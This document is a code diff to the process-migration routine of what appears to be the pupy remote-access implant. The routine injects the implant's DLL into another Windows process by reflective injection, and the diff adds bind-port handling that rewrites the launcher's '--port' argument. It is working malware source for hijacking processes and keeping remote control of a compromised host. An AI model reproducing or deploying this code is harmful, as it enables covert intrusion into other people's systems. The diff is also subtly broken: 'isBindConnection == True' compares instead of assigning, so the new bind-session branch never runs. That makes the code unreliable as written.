@@ -10,10 +10,16 @@ def has_proc_migrated(client, pid):
                 return c
     return None
 
-def migrate(module, pid, keep=False, timeout=30):
+def migrate(module, pid, keep=False, timeout=30, bindPort=None):
+    '''
+    - bindPort: The port used for listening on the target WHEN the current launcher uses a BIND connection.
+                When the current launcher uses a BIND connection, this session is kept even if keep==False
+                When bindPort!=None and the current launcher uses a REVERSE connection (e.g. connect, auto_proxy), bindPort is not used in this function
+    '''
     module.client.load_package("pupwinutils.processes")
     dllbuf=b""
     isProcess64bits=False
+    isBindConnection=False #If current launcher uses a BIND connection, isBindConnection == True
     module.success("looking for configured connect back address ...")
     try:
         res=module.client.conn.modules['pupy'].get_connect_back_host()
@@ -34,6 +40,13 @@ def migrate(module, pid, keep=False, timeout=30):
         arch='x86'
         module.success("process is 32 bits")
     conf=module.client.get_conf()
+    
+    #Manage when current launcher uses a BIND connection (and not a REVERSE connection)
+    if module.client.desc['launcher'] == "bind":
+        isBindConnection == True
+        module.success("the current launcher uses a bind connection")
+        module.success("the bind port {0} is defined in DLL configuration".format(bindPort))
+        conf['launcher_args'][conf['launcher_args'].index("--port")+1] = str(bindPort)
 
     #uncomment this to debug pupy injected DLL loading
     #conf['offline_script']=parse_scriptlets(["stdout_to_file,path=C:\\pupy.log"], debug=False)
@@ -48,7 +61,7 @@ def migrate(module, pid, keep=False, timeout=30):
     module.client.conn.modules['pupy'].reflective_inject_dll(pid, dllbuff, isProcess64bits)
     module.success("DLL injected !")
 
-    if keep:
+    if keep or isBindConnection:
         return
 
     module.success("waiting for a connection from the DLL ...")
